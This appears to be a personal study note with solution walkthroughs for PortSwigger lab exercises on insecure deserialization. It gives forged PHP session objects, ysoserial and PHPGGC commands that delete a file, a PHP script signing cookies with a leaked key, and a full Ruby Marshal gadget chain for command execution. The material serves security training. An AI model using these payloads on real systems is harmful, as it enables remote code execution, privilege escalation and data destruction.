<!-- omit in toc -->
## Table of Contents

- [[#Modifying serialized objects]]
- [[#Modifying serialized data types]]
- [[#Using application functionality to exploit insecure deserialization]]
- [[#Arbitrary object injection in PHP]]
- [[#Exploiting Java deserialization with Apache Commons]]
- [[#Exploiting PHP deserialization with a pre-built gadget chain]]
- [[#Exploiting Ruby deserialization using a documented gadget chain]]
- _**[[#Payloads]]**_

# Modifying serialized objects
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

```ad-done
title: Solution
1. Log in using your own credentials. Notice that the post-login `GET /my-account` request contains a session cookie that appears to be URL and Base64-encoded.
2. Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false`. Send this request to Burp Repeater.
3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the `admin` attribute to `b:1`. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
4. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have accessed the page with admin privileges.
5. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
6. Change the path of your request to 
	~~~
	/admin/delete?username=carlos
	~~~
1. and send the request to solve the lab.
```

# Modifying serialized data types
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

```ad-done
title: Solution
1. Log in using your own credentials. In Burp, open the post-login `GET /my-account` request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater.
2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows:
    
    - Update the length of the `username` attribute to `13`.
    - Change the username to `administrator`.
    - Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
    - Update the data type label for the access token by replacing `s` with `i`.
    
    The result should look like this:
    ~~~
    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
    ~~~
1. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
2. Send the request. Notice that the response now contains a link to the admin panel at `/admin`, indicating that you have successfully accessed the page as the `administrator` user.
3. Change the path of your request to `/admin` and resend it. Notice that the `/admin` page contains links to delete specific user accounts.
4. Change the path of your request to 
	~~~
	/admin/delete?username=carlos`
	~~~
1. and send the request to solve the lab.
```

# Using application functionality to exploit insecure deserialization
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

```ad-done
title: Solution
1. Log in to your own account. On the "My account" page, notice the option to delete your account by sending a `POST` request to `/my-account/delete`.
2. Send a request containing a session cookie to Burp Repeater.
3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an `avatar_link` attribute, which contains the file path to your avatar.
4. Edit the serialized data so that the `avatar_link` points to `/home/carlos/morale.txt`. Remember to update the length indicator. The modified attribute should look like this:
    ~~~
    s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
    ~~~
1. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
2. Change the request line to `POST /my-account/delete` and send the request. Your account will be deleted, along with Carlos's `morale.txt` file.
```

# Arbitrary object injection in PHP
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

```ad-done
title: Solution
1. Log in to your own account and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`. Right-click on the file and select "Send to Repeater".
3. In Burp Repeater, notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.
4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
    ~~~
    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
    ~~~
1. Base64 and URL-encode this object and save it to your clipboard.
2. Send a request containing the session cookie to Burp Repeater.
3. In Burp Repeater, replace the session cookie with the modified one in your clipboard.
4. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.
```

# Exploiting Java deserialization with Apache Commons
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons

```ad-done
title: Solution
1. Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
2. Download the "ysoserial" tool and execute the following command:
    ~~~
    java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
    ~~~
    This will generate a Base64-encoded serialized object containing your payload.
    
3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
4. Send the request to solve the lab.
```

# Exploiting PHP deserialization with a pre-built gadget chain
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

```ad-done
title: Solution
1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the **Inspector** panel.
2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
3. Copy the decoded cookie from the **Inspector** and paste it into Decoder.
4. In Decoder, highlight the token and then select **Decode as > Base64**. Notice that the token is actually a serialized PHP object.
5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:
    - A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`.
    - The error message reveals that the website is using the Symfony 4.3.6 framework.
6. Request the `/cgi-bin/phpinfo.php` file in Burp Repeater and observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.
7. Download the "PHPGGC" tool and execute the following command:
    ~~~
    ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
    ~~~
    This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's `morale.txt` file.
    
8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
    
    - Assign the object you generated in PHPGGC to the `$object` variable.
    - Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
    ~~~
    <?php $object = "OBJECT-GENERATED-BY-PHPGGC"; $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); echo $cookie;
    ~~~
    This will output a valid, signed cookie to the console.
    
9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.
```

# Exploiting Ruby deserialization using a documented gadget chain
Reference: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

```ad-done
title: Solution
1. Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
3. Modify the script as follows:
    - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
    - Replace the final two lines with `puts Base64.encode64(payload)`. This ensures that the payload is output in the correct format for you to use for the lab.
4. Run the script and copy the resulting Base64-encoded object.
5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
6. Send the request to solve the lab.
```

```ad-example
Above mentioned exploit written in ruby:
~~~ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
~~~
```

```ad-hint
A good online ruby compiler:
https://www.onlinegdb.com/online_ruby_compiler
```

# Payloads
![[InsecureDeserialization]]
